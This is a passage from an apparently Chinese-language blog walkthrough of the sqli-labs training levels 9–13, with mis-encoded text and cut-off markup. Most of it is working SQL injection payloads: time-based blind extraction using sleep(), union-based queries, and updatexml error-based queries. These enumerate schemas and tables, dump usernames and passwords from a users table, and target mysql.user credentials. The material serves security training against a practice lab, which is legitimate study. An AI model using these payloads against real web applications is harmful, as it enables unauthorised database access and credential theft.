sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())=4, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>è‹¥å»¶è¿Ÿï¼Œå½“å‰æ•°æ®åº“æœ‰4å¼ è¡¨ã€‚</p><p>2.2 çŒœè§£è¡¨åé•¿åº¦</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(lentgh((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>è‹¥å»¶è¿Ÿï¼Œç¬¬ä¸€å¼ è¡¨åé•¿åº¦ä¸º6ï¼ˆå¦‚<code>emails</code>ï¼‰ã€‚</p><p>2.3 é€å­—ç¬¦çŒœè§£è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬1ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>e</code>ï¼ˆASCIIç 101ï¼‰ã€‚</p><p>çŒœå¾—ç¬¬ä¸€ä¸ªæ•°æ®è¡¨çš„ç¬¬ä¸€ä½æ˜¯ e,â€¦ä¾æ¬¡ç±»æ¨ï¼Œå¾—åˆ° emails</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ç¬¬äºŒä¸ªæ•°æ®è¡¨çš„ç¬¬ä¸€ä½æ˜¯ r,â€¦ä¾æ¬¡ç±»æ¨ï¼Œå¾—åˆ° referers â€¦ </p><p>å†ä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„æ•°æ®è¡¨ emailsï¼Œreferersï¼Œuagentsï¼Œusersã€‚</p><p>æ¥ä¸‹æ¥åˆ¤æ–­å­—æ®µåä¸æ•°æ®å†…å®¹ï¼Œè¿˜æ˜¯å’Œä¸Šé¢ä¸€æ ·çš„å¥—è·¯ï¼Œåˆ¤æ–­é•¿åº¦ï¼Œåˆ¤æ–­åå­—</p><h6 id="è·å–åˆ—å"><a href="#è·å–åˆ—å" class="headerlink" title="è·å–åˆ—å"></a><strong>è·å–åˆ—å</strong></h6><p>3.1 çŒœåˆ—æ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if((select count(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27;)=3, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>è‹¥å»¶è¿Ÿï¼Œ<code>users</code>è¡¨æœ‰3åˆ—ã€‚</p><p>3.2 çŒœåˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),1,1))=105,sleep(2),0)--+</span><br></code></pre></td></tr></table></figure><p>åˆ¤æ–­ç¬¬ä¸€åˆ—çš„ç¬¬1ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>i</code>ï¼ˆASCIIç 105ï¼‰ã€‚</p><p>çŒœæµ‹ users è¡¨çš„åˆ—ï¼š</p><p>çŒœå¾— users è¡¨çš„ç¬¬ä¸€ä¸ªåˆ—çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ iï¼Œ ä»¥æ­¤ç±»æ¨ï¼Œå¾—åˆ°åˆ—åæ˜¯ idï¼Œusernameï¼Œpassword</p><h6 id="æå–æ•°æ®"><a href="#æå–æ•°æ®" class="headerlink" title="æå–æ•°æ®"></a><strong>æå–æ•°æ®</strong></h6><p>4.1 çŒœç”¨æˆ·åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27; and if(ascii(substr((select username from users limit 0,1), 1,1))=68,sleep(5),1)--+<br></code></pre></td></tr></table></figure><p>çŒœå¾— username çš„ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä½ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå¾—åˆ° usernameï¼Œpassword å­—æ®µçš„æ‰€æœ‰å†…å®¹ã€‚</p><ul><li><code>substr(...,x,y)</code> - ä»ä½ç½® x å¼€å§‹æˆªå– y ä¸ªå­—ç¬¦</li><li><code>ascii()</code> - è·å–å­—ç¬¦çš„ ASCII ç å€¼</li><li><code>(select count(table_name) from information_schema.tables where table_schema=database())=4</code><ul><li><code>information_schema.tables</code> - ç³»ç»Ÿè¡¨ï¼ŒåŒ…å«æ‰€æœ‰è¡¨ä¿¡æ¯</li><li><code>table_schema=database()</code> - é™åˆ¶åœ¨å½“å‰æ•°æ®åº“</li><li><code>count(table_name)</code> - è®¡ç®—è¡¨æ•°é‡</li><li><code>=4</code> - çŒœæµ‹å½“å‰æ•°æ®åº“æœ‰4ä¸ªè¡¨</li></ul></li></ul><h5 id="æ€»ç»“æ—¶é—´ç›²æ³¨ï¼š"><a href="#æ€»ç»“æ—¶é—´ç›²æ³¨ï¼š" class="headerlink" title="æ€»ç»“æ—¶é—´ç›²æ³¨ï¼š"></a>æ€»ç»“æ—¶é—´ç›²æ³¨ï¼š</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and sleep(1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">AND</span> IF(LENGTH(database())<span class="hljs-operator">&lt;</span><span class="hljs-number">10</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>#äºŒåˆ†æ³•æµ‹è¯•æ•°æ®åº“é•¿åº¦<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LENGTH(database())=8,sleep(1),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#ä½¿ç”¨ left() å‡½æ•°åˆ¤æ–­æ•°æ®åº“åçš„ç¬¬ä¸€ä½æ˜¯å¦æ˜¯å­—ç¬¦ aï¼Œæ³¨å…¥ä¹‹åå“åº”å¾ˆå¿«è¯´æ˜æ•°æ®åº“åç¬¬ä¸€ä½ä¸æ˜¯ aã€‚</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">AND</span> IF(<span class="hljs-keyword">LEFT</span>((<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;a&#x27;</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>#ä½¿ç”¨ç©·ä¸¾æ³•è¿›è¡Œæµ‹è¯•ï¼Œå¾—å‡ºæ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º â€œsâ€ã€‚<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LEFT((SELECT database()), 1)=&#x27;</span>s<span class="hljs-string">&#x27;,sleep(1),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#æ¥ä¸‹æ¥å¾—å‡ºæ•°æ®åº“åï¼Œå†ä½¿ç”¨åŒæ ·çš„æ–¹æ³•ç»§ç»­çˆ†ç ´è¡¨åã€å­—æ®µååŠå…¶å‰©ä½™ä¿¡æ¯ã€‚</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">AND</span> IF(<span class="hljs-keyword">LEFT</span>((<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">8</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><h4 id="Less-10-åŒå¼•å·-æ—¶é—´ç›²æ³¨"><a href="#Less-10-åŒå¼•å·-æ—¶é—´ç›²æ³¨" class="headerlink" title="Less-10-åŒå¼•å·-æ—¶é—´ç›²æ³¨"></a>Less-10-åŒå¼•å·-æ—¶é—´ç›²æ³¨</h4><p>å’Œless-9ä¸€æ ·ï¼Œæ³¨å…¥ç‚¹å˜ä¸º<code>&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plain">åˆ¤æ–­æ˜¯åŒå¼•å·çš„æ—¶é—´ç›²æ³¨<br>?id=1&quot; and sleep(2) --+<br><br>æ•°æ®åº“åé•¿åº¦<br>?id=1&quot; and if(length(database())=8,sleep(5),1)--+<br><br>æ•°æ®åº“åçŒœæµ‹<br>ç¬¬ä¸€ä½ï¼ˆs115ï¼‰ï¼š<br>?id=1&quot; and if(ascii(substr(database(),1,1))=115, sleep(2), 0) --+<br>ç¬¬äºŒä½ï¼ˆe101ï¼‰ï¼š<br>?id=1&quot; and if(ascii(substr(database(),2,1))=101, sleep(2), 0) --+<br>ä»¥æ­¤ç±»æ¨ï¼Œå¾—åˆ°æ•°æ®åº“åsecurity<br><br>securityåº“ä¸­è¡¨çš„æ•°é‡<br>?id=1&quot; and if((select count(table_name) from information_schema.tables where table_schema=database())=4, sleep(2), 0) --+<br><br>securityåº“ä¸­ç¬¬ä¸€å¼ è¡¨çš„é•¿åº¦<br>?id=1&quot; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6, sleep(2), 0) --+<br><br>securityåº“ä¸­çš„è¡¨å<br>ç¬¬ä¸€å¼ è¡¨ç¬¬ä¸€ä½å­—ç¬¦ï¼ˆe101ï¼‰ï¼š<br>?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101, sleep(2), 0) --+<br>ä¾æ­¤ç±»æ¨ï¼Œå¾—åˆ°æ‰€æœ‰çš„æ•°æ®è¡¨emailsï¼Œreferersï¼Œuagentsï¼Œusersã€‚<br><br><br>###############é—®é¢˜ï¼šusersè¡¨çš„åˆ—æ•°<br>?id=1&quot; and if((select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=4, sleep(2), 0) --+<br><br>usersè¡¨çš„ç¬¬ä¸€åˆ—åˆ—åï¼ˆi105ï¼‰ï¼š<br>?id=1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=105,sleep(2),0)--+<br>ä¾æ­¤ç±»æ¨ï¼Œå¾—åˆ°åˆ—åæ˜¯ idï¼Œusernameï¼Œpassword<br><br>usernameä¸­ç”¨æˆ·åçš„å­—ç¬¦ï¼ˆD68):<br>?id=1&quot; and if(ascii(substr((select username from users limit 0,1), 1,1))=68,sleep(5),1)--+<br></code></pre></td></tr></table></figure><h4 id="Less-11-â€˜-POST-union"><a href="#Less-11-â€˜-POST-union" class="headerlink" title="Less-11-â€˜-POST-union"></a>Less-11-â€˜-POST-union</h4><p>å°è¯•è¾“å…¥admin&#x2F;adminï¼Œç™»å½•æˆåŠŸäº†ã€‚ã€‚ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012937.png"></p><p>å°è¯•è¾“å…¥admin&#x2F;aaaï¼ˆå¯†ç éšä¾¿ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012805.png"></p><p>è¾“å…¥1â€™</p><p>å‡ºç°äº†æŠ¥é”™ <code>You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; and  password=&#39;&#39; LIMIT 0,1&#39; at line 1</code></p><p>å¼•å·ä¸åŒ¹é…ï¼Œ<code>&#39;1&#39;&#39;</code> æ˜¾ç¤ºå•å¼•å·æ²¡æœ‰æ­£ç¡®é—­åˆï¼›ç©ºå¯†ç æ¯”è¾ƒ</p><p>è¾“å…¥1â€™#ï¼Œå¯ä»¥ç¡®å®šæ˜¯å­—ç¬¦å‹æ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012912.png"></p><h5 id="æ–¹æ³•ä¸€è”åˆæ³¨å…¥"><a href="#æ–¹æ³•ä¸€è”åˆæ³¨å…¥" class="headerlink" title="æ–¹æ³•ä¸€è”åˆæ³¨å…¥"></a>æ–¹æ³•ä¸€è”åˆæ³¨å…¥</h5><p>ç”¨ union æ³¨å…¥è¿›è¡Œå°è¯•ï¼š<br><code>1&#39; union select 1,database() #</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012780.png"></p><p>æ˜¾ç¤ºå‡ºæ•°æ®åº“ï¼š<code>security</code></p><p>ä¹Ÿå¯ä»¥åˆ¤æ–­å­—æ®µæ•°</p><p>aâ€™ order by 1 â€“ a</p><p>aâ€™ order by 2 â€“ a</p><p>aâ€™ order by 3 â€“ a</p><p>ç¬¬3ä¸ªå­—æ®µæ’åºæ—¶å¼€å§‹æŠ¥é”™ï¼Œç¡®å®šè¿”å›ç»“æœçš„å­—æ®µæ•°ä¸º 2ã€‚</p><p>è·å–æ‰€æœ‰æ•°æ®åº“ï¼Œ</p><p>aâ€™ union select 1,(select group_concat(schema_name) from information_schema.schemata)  â€“ a</p><p>è·å– security åº“çš„æ‰€æœ‰è¡¨ï¼Œ</p><p>aâ€™ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;â€securityâ€)  â€“ a</p><p> è·å– users è¡¨çš„æ‰€æœ‰å­—æ®µ</p><p>aâ€™ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;â€securityâ€ and table_name&#x3D;â€usersâ€)  â€“ a</p><p> è·å–æ•°æ®åº“ç”¨æˆ·çš„å¯†ç </p><p>aâ€™ union select 1,group_concat(id, â€˜:â€™, username, â€˜:â€™, password) from security.users â€“ a</p><h5 id="æ–¹å¼äºŒï¼šæŠ¥é”™æ³¨å…¥"><a href="#æ–¹å¼äºŒï¼šæŠ¥é”™æ³¨å…¥" class="headerlink" title="æ–¹å¼äºŒï¼šæŠ¥é”™æ³¨å…¥"></a>æ–¹å¼äºŒï¼šæŠ¥é”™æ³¨å…¥</h5><p>åˆ¤æ–­æ˜¯å¦æŠ¥é”™<br>aâ€™</p><p>æŠ¥é”™<code>You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near &#39;&#39;a&#39;&#39; and  password=&#39;&#39; LIMIT 0,1&#39; at line 1</code>é€‚åˆä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚</p><p>åˆ¤æ–­æŠ¥é”™æ¡ä»¶<br>aâ€™ and updatexml(1,0x7e,3) â€“ a</p><p> é¡µé¢æ­£å¸¸æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ï¼Œç¡®å®šæŠ¥é”™å‡½æ•°å¯ä»¥ä½¿ç”¨ã€‚</p><p>è·å–æ‰€æœ‰æ•°æ®åº“ï¼Œ</p><p>aâ€™ and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),33,31)),3) â€“ a</p><p>è·å– security åº“çš„æ‰€æœ‰è¡¨ï¼Œ</p><p>aâ€™ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;â€securityâ€),1,31)),3) â€“ a</p><p> è·å– users è¡¨çš„æ‰€æœ‰å­—æ®µï¼Œ</p><p>aâ€™ and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;â€securityâ€ and table_name&#x3D;â€usersâ€),1,31)),3) â€“ a</p><p>è·å–æ•°æ®åº“ç”¨æˆ·çš„å¯†ç ï¼Œç”¨æˆ·åè¾“å…¥ï¼š</p><p>aâ€™ and updatexml(1,concat(0x7e,(select group_concat(user,password) from mysql.user where user &#x3D; â€˜mituanâ€™)),3) â€“ a</p><h4 id="Less-12-â€œ"><a href="#Less-12-â€œ" class="headerlink" title="Less-12-â€œ)"></a>Less-12-â€œ)</h4><p>ä¸less-11ä¸€æ ·ï¼Œæ³¨å…¥ç‚¹å˜ä¸º<code>&quot;)</code></p><p>ç”¨ union æ³¨å…¥è¿›è¡Œå°è¯•ï¼š<br><code>1&quot;) union select 1,database() #</code></p><p>æ˜¾ç¤ºå‡ºæ•°æ®åº“ï¼š<code>security</code></p><p>ä¹Ÿå¯ä»¥åˆ¤æ–­å­—æ®µæ•°</p><p>aâ€) order by 1 â€“ a</p><p>aâ€) order by 2 â€“ a</p><p>aâ€) order by 3 â€“ a</p><p>ç¬¬3ä¸ªå­—æ®µæ’åºæ—¶å¼€å§‹æŠ¥é”™ï¼Œç¡®å®šè¿”å›ç»“æœçš„å­—æ®µæ•°ä¸º 2ã€‚</p><p>è·å–æ‰€æœ‰æ•°æ®åº“ï¼Œ</p><p>aâ€) union select 1,(select group_concat(schema_name) from information_schema.schemata)  â€“ a</p><p>è·å– security åº“çš„æ‰€æœ‰è¡¨ï¼Œ</p><p>aâ€) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;â€securityâ€)  â€“ a</p><p> è·å– users è¡¨çš„æ‰€æœ‰å­—æ®µ</p><p>aâ€) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;â€securityâ€ and table_name&#x3D;â€usersâ€)  â€“ a</p><p> è·å–æ•°æ®åº“ç”¨æˆ·çš„å¯†ç </p><p>aâ€) union select 1,group_concat(id, â€˜:â€™, username, â€˜:â€™, password) from security.users â€“ a</p><h4 id="Less-13-æŠ¥é”™æ³¨å…¥-å¸ƒå°”ç›²æ³¨"><a href="#Less-13-æŠ¥é”™æ³¨å…¥-å¸ƒå°”ç›²æ³¨" class="headerlink" title="Less-13-&#39;)-æŠ¥é”™æ³¨å…¥-å¸ƒå°”ç›²æ³¨"></a>Less-13-<code>&#39;)</code>-æŠ¥é”™æ³¨å…¥-å¸ƒå°”ç›²æ³¨</h4><p>è¾“å…¥adminâ€™ ï¼Œ ç»™å‡ºæŠ¥é”™</p><p><code>You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near &#39;&#39;admin&#39;&#39;)  and password=(&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p><p>è¾“å…¥<code>admin&#39;) #</code>æˆ–è€…<code>admin&#39;)-- (--åè¦æœ‰ä¸€ä¸ªç©ºæ ¼)</code>ï¼Œ ç™»å½•æˆåŠŸï¼Œè¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹<code>&#39;)</code></p><p>è¿™ä¸€å…³ä¸­æ²¡æœ‰è¿”å›ç™»å½•ä¿¡æ¯ï¼Œåªæ˜¾ç¤ºç™»å½•æˆåŠŸä¸å¦ï¼Œå¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨å’ŒæŠ¥é”™æ³¨å…¥ï¼Œ</p><h5 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs sql">#åˆ¤æ–­æŠ¥é”™æ¡ä»¶<br><br>a<span class="hljs-string">&#x27;) and updatexml(1,0x7e,3) -- a</span><br><span class="hljs-string"></span><br><span class="hljs-string">##è¿”å›ï¼šXPATH syntax error: &#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">#è„±åº“</span><br><span class="hljs-string">##å°è¯•æŸ¥è¯¢mysql.userè¡¨</span><br><span class="hljs-string">a&#x27;</span>) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>,password) <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;mituan&#x27;</span>)),<span class="hljs-number">3</span>) <span class="hljs-comment">-- a</span><br><br>###è¿”å›ï¼š<span class="hljs-keyword">Only</span> constant XPATH queries <span class="hljs-keyword">are</span> supported<br><br><br>##æ”¹ç”¨information_schemaæŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“å<br>a<span class="hljs-string">&#x27;) and updatexml(1,concat(0x7e,(select group_concat(schema_name)</span><br><span class="hljs-string">from information_schema.schemata)),3) -- a</span><br><span class="hljs-string"></span><br><span class="hljs-string">###è¿”å›ï¼šXPATH syntax error: &#x27;</span><span class="hljs-operator">~</span>information_schema,challenges,m<span class="hljs-string">&#x27;ç”±äº updatexml() åªèƒ½è¿”å›çº¦32ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥åªæ˜¾ç¤ºäº†éƒ¨åˆ†æ•°æ®åº“å</span><br><span class="hljs-string">##å¯ä»¥åˆ†æ®µæŸ¥è¯¢ï¼š</span><br><span class="hljs-string">a&#x27;</span>) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>) <span class="hljs-comment">-- a</span><br>###è¿”å›ï¼šXPATH syntax error: <span class="hljs-string">&#x27;~information_schema&#x27;</span><br>a<span class="hljs-string">&#x27;) and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),3) -- a</span><br><span class="hljs-string">###è¿”å›ï¼šXPATH syntax error: &#x27;</span><span class="hljs-operator">~</span>challenges<span class="hljs-string">&#x27;</span><br><span class="hljs-string">a&#x27;</span>) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">5</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>) <span class="hljs-comment">-- a</span><br>###è¿”å›ï¼šXPATH syntax error: <span class="hljs-string">&#x27;~security&#x27;</span><br><br>#æŸ¥è¯¢ security æ•°æ®åº“çš„æ‰€æœ‰è¡¨å<br>a<span class="hljs-string">&#x27;) and updatexml(1,concat(0x7e,(select group_concat(table_name)</span><br><span class="hljs-string">from information_schema.tables</span><br><span class="hljs-string">where table_schema=&quot;security&quot;)),3) -- a</span><br><span class="hljs-string"></span><br><span class="hljs-string">##è¿”å›ï¼šXPATH syntax error: &#x27;</span><span class="hljs-operator">~</span>emails,referers,uagents,users<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"># æŸ¥è¯¢ users è¡¨çš„æ‰€æœ‰åˆ—å</span><br><span class="hljs-string">a&#x27;</span>) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name)<br><span class="hljs-keyword">from</span> information_schema.columns<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>&quot;security&quot; <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;)),<span class="hljs-number">3</span>) <span class="hljs-comment">-- a</span><br><br>##è¿”å›ï¼šXPATH syntax error: <span class="hljs-string">&#x27;~id,username,password&#x27;</span><br><br><br><br>#æŸ¥è¡¨ä¸­å†…å®¹ï¼ˆåˆ†æ®µæŸ¥è¯¢ï¼‰ï¼š<br><br>a<span class="hljs-string">&#x27;) and updatexml(1,concat(0x7e,(select concat(id,&#x27;</span>:<span class="hljs-string">&#x27;,username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from security.users limit 0,1)),3) -- a</span><br><span class="hljs-string"></span><br><span class="hljs-string">##è¿”å›ï¼šXPATH syntax error: &#x27;</span><span class="hljs-operator">~</span><span class="hljs-number">1</span>:Dumb:Dumb<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">a&#x27;</span>) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> concat(id,<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-string">&#x27;:&#x27;</span>,password) <span class="hljs-keyword">from</span> security.users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>) <span class="hljs-comment">-- a</span><br><br>##è¿”å›ï¼šXPATH syntax error: <span class="hljs-string">&#x27;~2:Angelina:I-kill-you&#x27;</span><br><br><br></code></pre></td></tr></table></figure><p>å¸¸è§çš„è„±åº“è¯­å¥ ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"># è·å–æ‰€æœ‰æ•°æ®åº“<br><span class="hljs-keyword">select</span> group_concat(schema_name)<br><span class="hljs-keyword">from</span> information_schema.schemata<br> <br># è·å– security åº“çš„æ‰€æœ‰è¡¨<br><span class="hljs-keyword">select</span> group_concat(table_name)<br><span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>&quot;security&quot;<br> <br># è·å– users è¡¨çš„æ‰€æœ‰å­—æ®µ<br><span class="hljs-keyword">select</span> group_concat(column_name)<br><span class="hljs-keyword">from</span> information_schema.columns<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>&quot;security&quot; <span class="hljs-keyword">and</span> table_name<span 